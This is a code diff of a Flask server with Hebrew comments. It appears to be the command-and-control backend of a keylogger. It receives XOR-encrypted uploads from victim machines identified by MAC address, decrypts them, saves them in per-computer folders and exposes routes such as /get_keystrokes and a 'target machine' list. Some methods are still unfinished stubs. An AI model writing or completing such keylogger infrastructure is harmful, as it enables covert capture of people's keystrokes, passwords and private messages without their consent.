@@ -3,6 +3,7 @@ from encryptor import Encryptor
 import json
 import os
 import time
+import logging
 
 class App:
 
@@ -12,14 +13,22 @@ class App:
         self.manager = {}
 
     def add_computer(self,computer_name):
-        pass
+        self.manager[f"computer {self.counter}"] = computer_name
+        self.counter += 1
 
-    def get_data(self):
+    def get_data(self,computer_name):
         pass
+        #בדיקה האם הכניס שם מחשב
+
+        #בדיקה האם המחשב נמצא במערכת
+
+        #קבלת רשימה של כל הקבצים
 
     def get_computer_list(self):
-        pass
-
+        computer_list = []
+        for computer in self.manager:
+            computer_list.append(computer)
+        return computer_list
 
 app = Flask(__name__)
 
@@ -31,12 +40,18 @@ def home():
 def upload():
 
     data = request.get_json()
+
+    # ניהול שגיאות
+    if error_manager(data):
+        return jsonify({"error": "error", "message": data})
+
     # process = SpecialKeys()
     decryptor = Encryptor()
 
-    #ניהול שגיאות
-    if error_manager(data):
-        return jsonify({"error" : "error","message" : data})
+    #להחזיר את ההצפנה למתונים המקוריים
+    print(data)
+    data = decryptor.xor(data)
+    print(data)
 
     #קבלת הנתונים המתאימים
     folder_name = data["mac_name"].replace(":","_")
@@ -44,13 +59,6 @@ def upload():
 
     #הוספת הכתבות למחלקה
     manager.add_computer(folder_name)
-
-
-    #להחזיר את ההצפנה לנתונים המקוריים
-    data["data"] = decryptor.decrypt_xor(new_data)
-
-    #לעשות על הנתונים פרוסס
-
 
     #יצירת תיקיה למחשב הנתון
     folder_path = "data\\" + folder_name
@@ -80,15 +88,18 @@ def generate_json_file():
 def save_data_in_DB(data,file_path):
     with open(file_path,'w',encoding="utf-8") as file:
         json.dump(data,file,indent=4,ensure_ascii=False)
+        logging.error(f"file {file_path} is opened")
 
 
 @app.route("/api/get_machine_list",methods=["GET"])
 def get_target_machine_list():
-    manager.get_computer_list()
+    return jsonify({"message" : manager.get_computer_list()})
 
 @app.route("/get_keystrokes",methods=["GET"])
 def get_data_from_DB():
     computer_name = request.args.get("computer")
+
+    manager.get_data(computer_name)
     #בדיקה האם שלח פרמטר מחשב
 
     #בדיקה האם קיים כזה מחשב
